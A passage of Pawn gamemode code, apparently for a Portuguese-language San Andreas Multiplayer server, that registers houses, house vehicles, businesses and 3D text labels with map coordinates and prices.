	CriarCasa(360, 2445.1953, -3502.7004, 7.7656, 166.1732,-1080.4869,1049.0234, 2, 500000, 500000, 362, 1080);
	CriarCasa(361, 2592.1455, -3442.0444, 9.2043, 215.6802,1456.4869,1084.3672, 4, 5000000, 5000000, 363, 1083);
	// Veículos das Casas
	CriarVeiculoCasa(1,0,-687.3868,965.7045,11.8777,90.9877,0,0, -1);
	CriarVeiculoCasa(2,0,1517.4708,-694.2891,94.4554,89.7378,0,0, -1);
	CriarVeiculoCasa(3,0,1354.9941,-630.3472,108.8381,17.4824,0,0, -1);
	CriarVeiculoCasa(4,0,2516.3625, -1671.9678, 13.5918, 58.2170,0,0, -1);
	CriarVeiculoCasa(5,0,2517.1094,-1664.5002,13.6933,96.5770,0,0, -1);
	CriarVeiculoCasa(6,0,2503.0354,-1657.8546,13.1154,53.9267,0,0, -1);
	CriarVeiculoCasa(7,0,2498.3149,-1653.5753,13.1456,80.1001,0,0, -1);
	CriarVeiculoCasa(8,0,2484.5068,-1654.7645,13.0966,89.7307,0,0, -1);
	CriarVeiculoCasa(9,0,2443.4265, -1645.5237, 13.1781, 178.6024,0,0, -1);
	CriarVeiculoCasa(10,0,2065.2610,-1694.3782,13.2522,269.6798,0,0, -1);
	CriarVeiculoCasa(12,0,1980.0782,-1710.6604,15.6740,270.3912,0,0, -1);
	CriarVeiculoCasa(13,0,1422.9460,-918.9777,35.7518,171.2688,0,0, -1);
	CriarVeiculoCasa(14,0,1529.5782,-813.4952,71.5919,89.4726,0,0, -1);
	CriarVeiculoCasa(15,0,1515.0631,-766.3877,79.9059,136.6565,0,0, -1);
	CriarVeiculoCasa(16,0,1460.4629,-634.8943,95.5478,178.9956,0,0, -1);
	CriarVeiculoCasa(17,0,1094.3132,-827.4517,86.6496,94.5609,0,0, -1);
	CriarVeiculoCasa(18,0,1108.7673,-732.5138,100.2081,90.7626,0,0, -1);
	CriarVeiculoCasa(19,0,1088.8481,-641.2798,112.8503,269.4590,0,0, -1);
	CriarVeiculoCasa(20,0,1052.0073,-638.1581,119.8224,96.0242,0,0, -1);
	CriarVeiculoCasa(21,0,1006.3774,-662.0094,120.8522,30.9535,0,0, -1);
	CriarVeiculoCasa(22,0,945.1553,-716.7941,121.9158,28.0664,0,0, -1);
	CriarVeiculoCasa(23,0,912.3835,-665.6247,117.1956,236.6676,0,0, -1);
	CriarVeiculoCasa(24,0,836.3948,-755.5460,85.7745,221.2043,0,0, -1);
	CriarVeiculoCasa(25,0,883.7321,-783.2852,101.6222,294.8188,0,0, -1);
	CriarVeiculoCasa(26,0,479.8321,-1089.8436,83.0432,358.0445,0,0, -1);
	CriarVeiculoCasa(27,0,287.5587,-1156.4557,81.2000,227.1200,0,0, -1);
	CriarVeiculoCasa(28,0,245.4468,-1234.4377,74.0680,305.8572,0,0, -1);
	CriarVeiculoCasa(29,0,277.5040,-1267.1361,75.0659,215.2186,0,0, -1);
	CriarVeiculoCasa(30,0,251.5024,-1358.9968,53.2786,306.3808,0,0, -1);
	CriarVeiculoCasa(31,0,311.2965,-1334.9668,53.3720,37.6192,0,0, -1);
	CriarVeiculoCasa(32,0,179.1255,-1332.2999,70.8059,177.9881,0,0, -1);
	CriarVeiculoCasa(33,0,730.7025,-1290.4763,13.7366,358.4771,0,0, -1);
	CriarVeiculoCasa(34,0,766.9962,-1421.3713,13.7076,359.4164,0,0, -1);
	CriarVeiculoCasa(35,0,2473.2305, -1694.3531, 13.2206, 359.9984,0,0, -1);
	CriarVeiculoCasa(36,0,1254.6884,-805.5715,83.8677,179.0475,0,0, -1);
	CriarVeiculoCasa(37,0,-77.9988,76.9696,3.3848,68.4252,0,0, -1);
	CriarVeiculoCasa(38,0,-901.0707,2688.1077,43.2706,44.7500,0,0, -1);
	CriarVeiculoCasa(39,0,1856.7719,-1924.3473,13.4724,89.9669,0,0, -1);
	CriarVeiculoCasa(40,0,1878.0116,-1924.3644,13.2521,89.9761,0,0, -1);
	CriarVeiculoCasa(41,0,1898.9370,-1924.6112,13.2533,89.1331,0,0, -1);
	CriarVeiculoCasa(42,0,1942.6576,-1924.9049,13.2513,90.1749,0,0, -1);
	CriarVeiculoCasa(43,0,1918.6223,-1924.9786,13.2516,90.1755,0,0, -1);
	CriarVeiculoCasa(44,0,1141.1304,-2037.0978,69.3960,269.9436,0,0, -1);
	CriarVeiculoCasa(48,0,707.6241,-1694.3922,3.7638,0.2565,0,0, -1);
	CriarVeiculoCasa(50,0,2519.7676,-1282.4758,34.5692,1.0032,0,0, -1);
	CriarVeiculoCasa(51,0,2818.6035,2265.1306,10.5474,180.1303,0,0, -1);
	CriarVeiculoCasa(52,0,2798.6558,2225.5518,10.5473,271.6242,0,0, -1);
	CriarVeiculoCasa(53,0,2535.9414,744.9554,10.5474,270.0467,0,0, -1);
	CriarVeiculoCasa(54,0,2617.5161,723.8155,10.5474,0.9170,0,0, -1);
	CriarVeiculoCasa(55,0,2443.7390,697.6362,11.0814,88.4873,0,0, -1);
	CriarVeiculoCasa(56,0,2354.0024,651.3694,11.0981,180.4541,0,0, -1);
	CriarVeiculoCasa(57,0,2212.9438,647.3034,10.8674,180.6750,0,0, -1);
	CriarVeiculoCasa(58,0,2363.1580,726.5258,10.9047,180.9505,0,0, -1);
	CriarVeiculoCasa(59,0,2213.0674,727.1468,10.8507,180.0946,0,0, -1);
	CriarVeiculoCasa(60,0,2128.0698,660.3079,10.8897,0.6493,0,0, -1);
	CriarVeiculoCasa(61,0,2076.9277,688.1819,10.9176,179.2831,0,0, -1);
	CriarVeiculoCasa(62,0,2008.6616,767.0726,10.9478,179.9917,0,0, -1);
	CriarVeiculoCasa(63,0,2127.3745,739.0555,10.9748,0.9001,0,0, -1);
	CriarVeiculoCasa(64,0,2161.0183,777.0677,10.9357,89.9561,0,0, -1);
	CriarVeiculoCasa(65,0,1853.9351,725.7637,10.8199,271.6869,0,0, -1);
	CriarVeiculoCasa(66,0,1903.3967,681.4406,10.5474,270.6947,0,0, -1);
	CriarVeiculoCasa(67,0,1905.7776,736.0991,10.5468,272.1383,0,0, -1);
	CriarVeiculoCasa(68,0,1947.3564,730.1666,10.5474,93.8612,0,0, -1);
	CriarVeiculoCasa(69,0,1951.1267,679.6194,10.5474,90.6746,0,0, -1);
	CriarVeiculoCasa(70,0,1427.3265,2000.1987,10.5474,0.9034,0,0, -1);
	CriarVeiculoCasa(71,0,-2381.3594,1123.1815,56.6984,162.4527,0,0, -1);
	CriarVeiculoCasa(72,0,-2435.0081,1136.9258,56.2352,176.3620,0,0, -1);
	CriarVeiculoCasa(73,0,-2489.9673,1137.9728,57.5770,178.9499,0,0, -1);
	CriarVeiculoCasa(74,0,-2546.4099,1141.4269,56.0634,166.7395,0,0, -1);
	CriarVeiculoCasa(75,0,-2473.0427,1248.0194,35.4790,273.3703,0,0, -1);
	CriarVeiculoCasa(76,0,-2379.3623,1342.1732,13.6770,268.2826,0,0, -1);
	CriarVeiculoCasa(77,0,-2897.6902,1175.7253,15.7467,270.4544,0,0, -1);
	CriarVeiculoCasa(78,0,-2838.3523,925.6689,46.5636,273.3635,0,0, -1);
	CriarVeiculoCasa(79,0,-2858.9583,680.7177,24.6765,295.7650,0,0, -1);
	CriarVeiculoCasa(80,0,-2718.3013,981.3989,55.9719,8.8677,0,0, -1);
	CriarVeiculoCasa(81,0,-2661.5583,990.4232,66.2099,359.4951,0,0, -1);
	CriarVeiculoCasa(82,0,-2636.1702,930.9497,72.1993,178.1087,0,0, -1);
	CriarVeiculoCasa(83,0,-2680.7319,868.9680,77.8258,7.6084,0,0, -1);
	CriarVeiculoCasa(84,0,-2724.1372,915.3228,68.5916,104.4300,0,0, -1);
	CriarVeiculoCasa(85,0,-2714.0010,870.2825,71.6749,90.2129,0,0, -1);
	CriarVeiculoCasa(86,0,-2697.5710,826.6564,50.7140,181.2130,0,0, -1);
	CriarVeiculoCasa(87,0,-2735.6270,720.2889,42.2470,179.2932,0,0, -1);
	CriarVeiculoCasa(88,0,-2620.7410,729.1437,30.2211,270.6780,0,0, -1);
	CriarVeiculoCasa(89,0,-2618.1506,798.9344,50.8746,269.0716,0,0, -1);
	CriarVeiculoCasa(90,0,-2624.6921,893.4102,66.6001,274.9032,0,0, -1);
	CriarVeiculoCasa(91,0,-2796.8923,223.8482,7.9153,91.0507,0,0, -1);
	CriarVeiculoCasa(92,0,-2796.5684,180.7524,7.5982,90.6492,0,0, -1);
	CriarVeiculoCasa(93,0,-2796.7749,53.0166,7.6947,359.3589,0,0, -1);
	CriarVeiculoCasa(94,0,-2796.6497,-183.9400,7.9644,90.2692,0,0, -1);
	CriarVeiculoCasa(95,0,-2662.9968,-286.1310,8.4450,314.7298,0,0, -1);
	CriarVeiculoCasa(96,0,686.6584,-1073.0121,49.2557,58.3662,0,0, -1);
	CriarVeiculoCasa(97,0,-2718.0386,-33.9002,4.9914,269.2469,0,0, -1);
	CriarVeiculoCasa(98,0,-2694.5710,112.8088,4.9667,89.3487,0,0, -1);
	CriarVeiculoCasa(99,0,-2638.4614,250.2303,4.8851,88.9586,0,0, -1);
	CriarVeiculoCasa(100,0,-2448.4241,-118.1876,26.4131,91.9444,0,0, -1);
	CriarVeiculoCasa(101,0,-2206.6340,715.7536,50.2306,1.9371,0,0, -1);
	CriarVeiculoCasa(102,0,-2102.9343,893.2582,76.8949,0.4219,0,0, -1);
	CriarVeiculoCasa(103,0,-2159.3860,1231.2446,34.8797,88.2319,0,0, -1);
	CriarVeiculoCasa(104,0,-1974.6974,1276.2445,8.1051,0.0583,0,0, -1);
	CriarVeiculoCasa(105,0,-1874.1185,1120.5602,46.1725,359.0143,0,0, -1);
	CriarVeiculoCasa(106,0,-1873.8445,1151.4510,46.7101,358.9590,0,0, -1);
	CriarVeiculoCasa(107,0,1109.9283,-305.3158,75.0130,88.6266,0,0, -1);
	CriarVeiculoCasa(108,0,-2050.2712,781.1205,61.0368,179.2603,0,0, -1);
	CriarVeiculoCasa(109,0,-2048.0483,759.8347,61.2792,356.9721,0,0, -1);
	CriarVeiculoCasa(110,0,1274.9363,2526.9558,11.2552,270.0052,0,0, -1);
	CriarVeiculoCasa(111,0,1457.1399,2518.2534,12.3280,270.0717,0,0, -1);
	CriarVeiculoCasa(112,0,1497.2955,2541.9529,11.2059,90.8170,0,0, -1);
	CriarVeiculoCasa(113,0,1460.6254,2839.8130,12.2802,179.9341,0,0, -1);
	CriarVeiculoCasa(114,0,1579.0714,2839.7300,11.7921,180.3355,0,0, -1);
	CriarVeiculoCasa(115,0,1671.7687,2694.6052,11.2073,0.4568,0,0, -1);
	CriarVeiculoCasa(116,0,1914.8673,2778.1138,12.1533,180.1736,0,0, -1);
	CriarVeiculoCasa(117,0,2113.0046,2660.9722,12.5905,90.1069,0,0, -1);
	CriarVeiculoCasa(118,0,985.4224,2307.2012,12.4076,269.0419,0,0, -1);
	CriarVeiculoCasa(119,0,993.5674,2270.2554,11.6527,0.6338,0,0, -1);
	CriarVeiculoCasa(120,0,1033.2881,2020.5304,11.6590,90.6410,0,0, -1);
	CriarVeiculoCasa(121,0,984.0276,1986.1713,11.9769,271.0129,0,0, -1);
	CriarVeiculoCasa(122,0,933.1169,2012.5775,11.4080,89.9835,0,0, -1);
	CriarVeiculoCasa(123,0,923.1568,2035.5889,12.4902,178.4410,0,0, -1);
	CriarVeiculoCasa(124,0,1030.9832,1912.8907,11.7495,89.5828,0,0, -1);
	CriarVeiculoCasa(125,0,1321.0928,2012.7382,11.5060,89.5903,0,0, -1);
	CriarVeiculoCasa(126,0,1317.7046,1940.3094,13.3063,0.0295,0,0, -1);
	CriarVeiculoCasa(127,0,1363.2827,1966.9966,11.7740,270.8000,0,0, -1);
	CriarVeiculoCasa(128,0,1413.8922,1903.1510,11.5786,90.6611,0,0, -1);
	CriarVeiculoCasa(129,0,1472.8647,1899.3533,10.8306,270.9216,0,0, -1);
	CriarVeiculoCasa(130,0,1447.2256,1949.1477,11.6270,0.1872,0,0, -1);
	CriarVeiculoCasa(131,0,1527.3076,1999.0507,11.4745,359.0600,0,0, -1);
	CriarVeiculoCasa(239,0,2392.8931,-1375.6843,24.0769,88.8958,0,0, -1);
	//
	CriarVeiculoCasa(357,0,2475.6946, -3480.9377, 7.4927+2, 346.2500,0,0, -1);
	CriarVeiculoCasa(358,0,2456.1838, -3490.5522, 7.4927+2, 345.7598,0,0, -1);
	CriarVeiculoCasa(359,0,2447.8833, -3496.7344, 7.4927+2, 347.0143,0,0, -1);
	CriarVeiculoCasa(360,0,2440.2722, -3502.8181, 7.5871+2, 345.6897,0,0, -1);
	CriarVeiculoCasa(361,0,2339.4241, 576.4761, 7.5256+2, 179.4019,0,0, -1);
	//-- Empresas
	CriarEmpresa(1, "Food Mart", 1315.464111, -898.710998, 39.578125, -25.837999, -187.239395, 1003.546875, 17, 1, 300000);
	CriarEmpresa(2, "Roboi1s Food", 1352.373046, -1758.632324, 13.507812, 6.091599, -30.549299, 1003.549377, 10, 2, 250000);
	CriarEmpresa(4, "Market", 2140.333007, -1176.803833, 23.992187, -25.832300, -140.684997, 1003.546875, 16, 4, 250000);
	CriarEmpresa(6, "TABLEAU", 559.762084, -1506.726562, 14.543160, -27.589300, -57.167499, 1003.546875, 6, 6, 280000);
	CriarEmpresa(7, "AMMU-NATION", 2400.424072, -1981.291870, 13.546875, 285.601013, -41.051300, 1001.515625, 1, 7, 280000);
	CriarEmpresa(8, "AMMU-NATION", 1368.043701, -1279.949951, 13.546875, 314.820983,-141.431991,999.601562, 7, 8, 350000);
	CriarEmpresa(9, "TATTOOS", 2069.252929, -1779.892578, 13.559297, -204.354598, -26.642499, 1002.273376, 16, 9, 250000);
	CriarEmpresa(10, "Pizzaria", 2105.105468, -1806.479858, 13.554687, 372.079895, -132.395095, 1001.492187, 5, 10, 270000);
	CriarEmpresa(11, "Sex Video", 2139.194335, -1743.482299, 13.552368, -100.455299, -24.469100, 1000.718811, 3, 11, 220000);
	CriarEmpresa(12, "GYM", 2229.217773, -1722.098876, 13.562500, 773.784118, -77.836196, 1000.661315, 7, 12, 300000);
	CriarEmpresa(13, "CLUCKIN BELL", 2397.887451, -1898.007080, 13.546875, 365.111114, -10.971799, 1001.851623, 9, 13, 290000);
	CriarEmpresa(14, "SEX SHOP", 1940.378051, -2115.974365, 13.695312, -100.455299, -24.469100, 1000.718811, 3, 14, 300000);
	CriarEmpresa(15, "BOBO", 821.769714, -1758.119628, 13.648437, 773.629028, -49.462501, 1000.585876, 6, 15, 350000);
	CriarEmpresa(16, "Burger Shot", 811.147644, -1616.114013, 13.546875, 363.414611, -74.365303, 1001.507812, 10, 16, 330000);
	CriarEmpresa(17, "BARBER SALON", 823.338378, -1589.021728, 13.554450, 411.523986, -22.786100, 1001.804687, 2, 17, 250000);
	CriarEmpresa(19, "CLUCKIN' NELL", 927.195251, -1352.832153, 13.376651, -100.455299, -24.469100, 1000.718811, 3, 19, 350000);
	CriarEmpresa(20, "CATHAY", 998.929870, -1131.920776, 23.828125, 974.485412, -8.716199, 1001.148376, 3, 20, 300000);
	CriarEmpresa(21, "Sub Urban", 2112.819824, -1212.503784, 23.964399, 203.630493, -49.946998, 1001.804687, 1, 21, 250000);
	CriarEmpresa(23, "Pig Pen", 2421.590087, -1219.911010, 25.518304, 1204.656860, -13.272500, 1000.921875, 2, 23, 400000);
	CriarEmpresa(24, "CARWASH", 2440.282226, -1472.441162, 24.000000, 964.865173, 2159.355468, 1011.030273, 1, 24, 350000);
	CriarEmpresa(25, "CLUCKIN BELL", 2420.779541, -1509.034790, 24.000000, 365.111114, -10.971799, 1001.851623, 9, 25, 330000);
	CriarEmpresa(26, "Zip", 1457.943847, -1138.051879, 24.010606, 161.198806, -96.252799, 1001.804687, 18, 26, 350000);
	CriarEmpresa(29, "Banco", 1462.511108, -1013.706237, 26.843750, 833.768676, 7.284800, 1004.179687, 3, 29, 500000);
	CriarEmpresa(30, "PROlaps", 499.989532, -1359.190185, 16.248178, 206.901794, -139.172698, 1003.507812, 3, 30, 290000);
	CriarEmpresa(31, "VICTIM", 460.088531, -1500.984619, 31.056472, 226.692199, -8.083700, 1002.210876, 5, 31, 300000);
	CriarEmpresa(32, "Binco", 2244.645507, -1664.581298, 15.476562, 207.352798, -110.384696, 1005.132812, 15, 32, 250000);
	CriarEmpresa(33, "TEN GREEN", 2309.754394, -1644.169189, 14.827047, -228.481704, 1401.596801, 27.765600, 18, 33, 240000);
	// Empresas SF
	CriarEmpresa(35, "Jizzy Club's", -2624.466064, 1412.001586, 7.093750, -2637.449951, 1404.627563, 906.460876, 3, 35, 700000); // Int 44
	CriarEmpresa(37, "Cluckin Bell", -2671.494140, 259.470520, 4.632812, 365.111114, -10.971799, 1001.851623, 9, 37, 300000); // Int 23
	CriarEmpresa(38, "The Well", -1807.935302, 945.198547, 24.890625, 372.079895, -132.395095, 1001.492187, 5, 38, 350000); // Int 22
	CriarEmpresa(39, "VICTIM", -1695.502197, 951.007812, 24.890625, 226.692199, -8.083700, 1002.210876, 5, 39, 300000); // Int 29
	CriarEmpresa(40, "Banco San Fierro", -2665.243896, -7.562736, 6.132812, 833.768676, 7.284800, 1004.179687, 3, 40, 500000); // Int 18
	// Empresas LV
	CriarEmpresa(41, "Royal Casino", 2089.600585, 1451.328491, 10.820312, 1133.566040, -14.818499, 1000.679687, 12, 41, 600000); // Int 17
	CriarEmpresa(42, "Caligula's 2", 2195.835205, 1677.162231, 12.367187, 2233.928710, 1713.350219, 1012.109924, 1, 42, 1000000); // Int 15
	CriarEmpresa(43, "Top Heavy", 2506.894775, 2121.349609, 10.840066, 1204.656860, -13.272500, 1000.921875, 2, 43, 450000); // Int 38
	CriarEmpresa(44, "AMMU-NATION", 2556.990234, 2064.558349, 11.099519, 296.707397, -110.990402, 1001.515625, 6, 44, 350000); // Int 9
	CriarEmpresa(45, "Burger Shot", 2472.202392, 2034.134399, 11.062500, 363.414611, -74.365303, 1001.507812, 10, 45, 300000); // Int 21
	CriarEmpresa(46, "Cluckin' Bell", 2393.182861, 2042.465942, 10.820312, 365.111114, -10.971799, 1001.851623, 9, 46, 250000); // Int 23
	CriarEmpresa(48, "The For Dragons", 2020.776000, 1007.602294, 10.820312, 2018.031738, 1017.536987, 996.875000, 10, 48, 900000); // Int 16
	CriarEmpresa(49, "Ammu-Nation", 2158.278564, 943.146423, 10.820312, 285.761596, -85.367202, 1001.515625, 4, 49, 400000); // Int 8
	CriarEmpresa(50, "Posto Las Venturas", 2117.480224, 898.109741, 11.179687, -27.589300, -57.167499, 1003.546875, 6, 50, 290000); // Int 6
	CriarEmpresa(51, "Nude Stripper", 2543.261230, 1024.267578, 10.820312, 1211.974487, -26.684600, 1000.953125, 3, 51, 350000); // Int 37
	CriarEmpresa(52, "Cargas Viva WE", 2814.652099, 972.860839, 10.750000, -957.831420, 1881.237182, 9.000000, 17, 52, 450000); // Int 14
	CriarEmpresa(53, "The Well", 2756.089355, 2476.546630, 11.062500, 372.079895, -132.395095, 1001.492187, 5, 53, 300000); // Int 22
	CriarEmpresa(54, "Sub Urban", 2778.875976, 2453.064941, 11.062500, 203.630493, -49.946998, 1001.804687, 1, 54, 350000); // Int 30
	CriarEmpresa(55, "VICTIM", 2802.411376, 2430.141845, 11.062500, 226.692199, -8.083700, 1002.210876, 5, 55, 360000); // Int 29
	CriarEmpresa(56, "Train Hard", 2825.374267, 2406.899169, 11.062500, 206.901794, -139.172698, 1003.507812, 3, 56, 350000); // Int 28
	CriarEmpresa(57, "Cluckin' Bell", 2846.815673, 2414.407714, 11.068956, 365.111114, -10.971799, 1001.851623, 9, 57, 290000); // Int 23
	CriarEmpresa(58, "ZIP", 2090.423339, 2223.458007, 11.023437, 161.198806, -96.252799, 1001.804687, 18, 58, 350000); // Int 32
	CriarEmpresa(59, "Rock Hotel", 2637.312500, 2351.615966, 10.820312, 974.485412, -8.716199, 1001.148376, 3, 59, 1000000); // Int 36
	CriarEmpresa(60, "Supa Save", -2442.652587, 754.006408, 35.171875, -25.837999, -187.239395, 1003.546875, 17, 60, 450000); // Int 1
	// Empresas SF
	CriarEmpresa(61, "Cobra Marital Arts", -2269.168945, -155.882873, 35.320312, 773.629028, -49.462501, 1000.585876, 6, 61, 800000); // Int 42
	 // Empresas LS
	CriarEmpresa(62, "Burger Shot", 1199.465087, -919.259582, 43.113391, 363.414611, -74.365303, 1001.507812, 10, 62, 400000); // Int 21
	// Novas
	CriarEmpresa(63, "QUEENS", -2591.366943, 168.653594, 4.470185, 2266.965087, 1647.895507, 1084.234375, 1, 63, 300000); // Int 19
	CriarEmpresa(64, "The Barbers Pole", -2570.799804, 246.065063, 10.099188, 411.773406, -53.717300, 1001.898376, 12, 64, 350000); // Int 35
	CriarEmpresa(65, "Burger Shot", -1911.795043, 828.549865, 35.174381, 363.414611, -74.365303, 1001.507812, 10, 65, 320000); // Int 21
	CriarEmpresa(66, "ZIP", -1883.181396, 865.524536, 35.171875, 161.198806, -96.252799, 1001.804687, 18, 66, 400000); // Int 32
	CriarEmpresa(67, "Binco", -2374.775146, 910.131774, 45.445312, 207.352798, -110.384696, 1005.132812, 15, 67, 350000); // Int 34
	CriarEmpresa(68, "Burger Shot", -2356.908691, 1008.164733, 50.898437, 363.414611, -74.365303, 1001.507812, 10, 68, 400000); // Int 21
	CriarEmpresa(69, "The Well", -1721.820190, 1359.750000, 7.185316, 372.079895, -132.395095, 1001.492187, 5, 69, 450000); // Int 22
	CriarEmpresa(70, "Burger Shot", -2336.106445, -166.923110, 35.554687, 363.414611, -74.365303, 1001.507812, 10, 70, 400000); // Int 21
	CriarEmpresa(71, "DONUTS", -2767.353271, 788.784057, 52.781250, -228.481704, 1401.596801, 27.765600, 18, 71, 300000); // Int 40
	CriarEmpresa(72, "Restaurant", -2523.535888, 1216.211181, 37.428329, 459.566192, -88.641502, 999.554687, 4, 72, 350000); // Int 39
	CriarEmpresa(73, "AMMU-NATION", -2093.096435, -2464.365966, 30.625000, 316.314086, -169.066696, 999.593811, 6, 73, 250000); // Int 11
	CriarEmpresa(74, "Cluckin' Bell", -2154.665283, -2460.606445, 30.851562, 365.111114, -10.971799, 1001.851623, 9, 74, 300000); // Int 23
	CriarEmpresa(75, "Gas", -2232.059814, -2557.925537, 31.921875, -228.481704, 1401.596801, 27.765600, 18, 75, 380000); // Int 40
	CriarEmpresa(76, "Monte Chiliad", -2409.569824, -2189.833984, 34.039062, 964.865173, 2159.355468, 1011.030273, 1, 76, 400000); // Int 41
	CriarEmpresa(77, "Empresa de Energia", -2521.136962, -623.985534, 132.780715, -957.831420, 1881.237182, 9.000000, 17, 77, 600000); // Int 14
	CriarEmpresa(78, "Academia", -2491.567138, 2363.216796, 10.272698, 773.784118, -77.836196, 1000.661315, 7, 78, 350000); // Int 43
	CriarEmpresa(79, "Jays", -1941.360473, 2379.664550, 49.696559, 376.620788, -192.283798, 1000.632812, 17, 79, 300000); // Int 24
	CriarEmpresa(80, "AMMU-NATION", -1508.859497, 2610.036132, 55.835937, 296.707397, -110.990402, 1001.515625, 6, 80, 250000); // Int 9
	CriarEmpresa(81, "BARBERS", -1450.018432, 2592.754394, 55.835937, 418.375488, -83.647201, 1001.804687, 3, 81, 250000); // Int 27
	CriarEmpresa(82, "SMOKIN' BEEF", -857.680603, 1535.882202, 22.587043, 376.620788, -192.283798, 1000.632812, 17, 82, 320000); // Int 24
	CriarEmpresa(83, "Cluckin' Bell", -1213.300415, 1830.875488, 41.929687, 365.111114, -10.971799, 1001.851623, 9, 83, 380000); // Int 23
	CriarEmpresa(84, "BAR", -180.122497, 1087.937744, 19.742187, -228.481704, 1401.596801, 27.765600, 18, 84, 350000); // Int 40
	CriarEmpresa(85, "King Ring", -144.026275, 1222.932495, 19.899219, 376.620788, -192.283798, 1000.632812, 17, 85, 380000); // Int 24
	CriarEmpresa(86, "Bar da Vaca", -19.147558, 1176.150146, 19.563381, -228.481704, 1401.596801, 27.765600, 18, 86, 250000); // Int 40
	CriarEmpresa(87, "Lil' Probe'Inn", -88.322143, 1378.413696, 10.273437, 459.566192, -88.641502, 999.554687, 4, 87, 280000); // Int 39
	CriarEmpresa(88, "The Well", 2083.332519, 2223.903076, 11.023437, 372.079895, -132.395095, 1001.492187, 5, 88, 300000); // Int 22
	CriarEmpresa(88, "Cluckin' Bell", 2102.673583, 2228.811767, 11.023437, 365.111114, -10.971799, 1001.851623, 9, 88, 300000); // Int 23
	CriarEmpresa(89, "Binco", 2102.797607, 2257.449462, 11.023437, 207.352798, -110.384696, 1005.132812, 15, 89, 300000); // Int 34
	CriarEmpresa(90, "Casino", 2331.154296, 2165.621337, 10.828125, 1133.566040, -14.818499, 1000.679687, 12, 90, 600000); // Int 17
	CriarEmpresa(91, "Clowns Pocket", 2225.134521, 1838.585449, 10.820312, 974.485412, -8.716199, 1001.148376, 3, 91, 450000); // Int 36
	CriarEmpresa(92, "24 Seven", 2546.479003, 1971.296386, 10.820312, -25.837999, -187.239395, 1003.546875, 17, 92, 400000); // Int 1
	CriarEmpresa(93, "General STORE", 2810.919677, 1986.250854, 10.820312, 6.091599, -30.549299, 1003.549377, 10, 93, 390000); // Int 2
	CriarEmpresa(94, "Spread Ranch", 693.599060, 1966.490966, 5.539062, 1211.974487, -26.684600, 1000.953125, 3, 94, 550000); // Int 37
	CriarEmpresa(95, "Burger Shot", 2169.835693, 2795.845947, 10.820312, 363.414611, -74.365303, 1001.507812, 10, 95, 390000); // Int 21
	CriarEmpresa(96, "Binco", 1656.141479, 1733.247924, 10.828111, 207.352798, -110.384696, 1005.132812, 15, 96, 390000); // Int 34
	CriarEmpresa(97, "Casino", 1658.623901, 2251.175292, 11.070102, 1133.566040, -14.818499, 1000.679687, 12, 97, 500000); // Int 17
	CriarEmpresa(98, "SteakeHouse", 1694.744384, 2207.833496, 11.069177, 376.620788, -192.283798, 1000.632812, 17, 98, 350000); // Int 24
	CriarEmpresa(99, "GYM", 1968.794555, 2295.092285, 16.455863, 773.784118, -77.836196, 1000.661315, 7, 99, 450000); // Int 43
	CriarEmpresa(100, "The Well", 1367.022827, 248.602478, 19.566932, 372.079895, -132.395095, 1001.492187, 5, 100, 400000); // Int 22
	CriarEmpresa(101, "Lanchonete", 2637.332519, 1128.456054, 11.179687, 376.620788, -192.283798, 1000.632812, 17, 101, 350000); // Int 24
	CriarEmpresa(102, "Hardon", 2861.676269, 2430.471679, 11.068956, -27.589300, -57.167499, 1003.546875, 6, 102, 250000); // Int 6
	CriarEmpresa(103, "24 Seven", 2884.894531, 2453.758789, 11.068956, -25.837999, -187.239395, 1003.546875, 17, 103, 300000); // Int 1
	CriarEmpresa(104, "Erotic", 2500.151123, 2241.842529, 10.820312, 974.485412, -8.716199, 1001.148376, 3, 104, 300000); // Int 36
	CriarEmpresa(105, "Sex Shop", 2515.750244, 2297.372070, 10.820312, -100.455299, -24.469100, 1000.718811, 3, 105, 350000); // Int 26
	CriarEmpresa(106, "Casino Hotel", 2217.323486, 2123.949462, 10.820312, 1204.656860, -13.272500, 1000.921875, 2, 106, 450000); // Int 38
	CriarEmpresa(107, "Casino", 2314.039550, 2118.210693, 10.828125, 1133.566040, -14.818499, 1000.679687, 12, 107, 700000); // Int 17
	// DS
	CriarEmpresa(108, "DS", 1643.3785, -2281.4272, -1.1968, 204.2934, -168.0919, 1000.5234, 14, 108, 500000); // DS
	// Text Label Informações do servidor
	Create3DTextLabel("{FF1E1E}DriveThru", 0xFFD700FF, 2401.9275,-1506.4696,23.3550, 40.0,0,0);
	Create3DTextLabel("{FF1E1E}DriveThru", 0xFFD700FF, 800.5552,-1629.6398,12.9030, 40.0,0,0);
	Create3DTextLabel("{FF1E1E}DriveThru", 0xFFD700FF, 2486.0686,2022.3807,10.3402, 40.0,0,0);
	Create3DTextLabel("{FF1E1E}DriveThru", 0xFFD700FF, 1179.7521,-902.8798,42.8330, 40.0,0,0);
	Create3DTextLabel("{FF1E1E}DriveThru", 0xFFD700FF, 1857.3107,2081.2676,10.3387, 40.0,0,0);
	Create3DTextLabel("{FF1E1E}DriveThru", 0xFFD700FF, -2350.0037,-155.5846,34.8405, 40.0,0,0);
	Create3DTextLabel("{1E90FF}Cofre do Banco", 0xFFFFFFFF, 1767.4434,-1699.8270,13.5096, 6.0,0,0);
	Create3DTextLabel("{1E90FF}Acesso a Los Santos - Use: {FF1E1E}/AcessoTerra", 0x008080FF, 2583.8850, -3412.0552, 2.1535, 75.0,0,0);
	Create3DTextLabel("{1E90FF}Acesso a Ilha Sul - Use: {FF1E1E}/AcessoIlha", 0x008080FF, 1389.1432, -2688.5422, 13.5391, 75.0,0,0);
	Create3DTextLabel("{FF1E1E}Acesso ao {1E90FF}Cruzeiro {FF1E1E}- Use: {FF1E1E}/Cruzeiro", 0x008080FF, 700.5837,-2223.1948,-0.7543, 35.0,0,0);
	Create3DTextLabel("{FF1E1E}Acesso ao clube do {1E90FF}Cruzeiro {FF1E1E}\nUse: {FF1E1E}'{1E90FF}F{FF1E1E}' ou '{1E90FF}/Entrar{FF1E1E}'", 0x008080FF, 625.7263,-2244.6213,13.1349, 20.0,0,0);
	Create3DTextLabel("{FF1E1E}Acesso ao {1E90FF}Mar {FF1E1E}- Use: {FF1E1E}/Mar", 0x008080FF, 700.3476,-2229.4753,13.1089, 35.0,0,0);
	Create3DTextLabel("{1E90FF}Para estacionar seu veículo, volte e\nutilize o estacionamento logo abaixo.", 0x008080FF, -299.3305,1472.4484,74.9218, 25.0,0,0);
	Create3DTextLabel("{1E90FF}Oficina de Tunning {FFFFFF}Use: /Tunar ou /Remover", 0xFFFFFFFF, 1708.7620, -1793.4124, 14.6142, 40.0, 0);
